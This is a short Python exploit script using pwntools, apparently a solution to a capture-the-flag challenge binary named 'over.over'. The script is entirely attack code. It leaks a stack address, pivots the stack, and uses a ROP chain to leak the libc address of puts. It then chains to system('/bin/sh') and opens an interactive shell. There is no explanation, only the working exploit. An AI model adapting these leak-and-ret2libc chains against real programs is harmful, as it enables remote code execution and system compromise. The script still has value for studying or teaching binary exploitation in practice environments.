from pwn import *
context.binary = "./over.over"
io = process("./over.over")
elf = ELF("./over.over")
libc = elf.libc

io.sendafter(">", 'a' * 80)
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - 0x70

io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - libc.sym['puts']
pop_rdx_pop_rsi_ret=0x400791

pop_rdi_ret = 0x400793

payload=flat(['22222222', pop_rdi_ret, next(libc.search("/bin/sh")),libc.sym['system']+0x1b,pop_rdx_pop_rsi_ret,p64(0),p64(0),  (80 - 7*8 ) * '2', stack - 0x30, 0x4006be])
info(hex(libc.sym['system']))
io.sendafter(">", payload)
io.interactive()
# pop_rdi_ret=0x400793
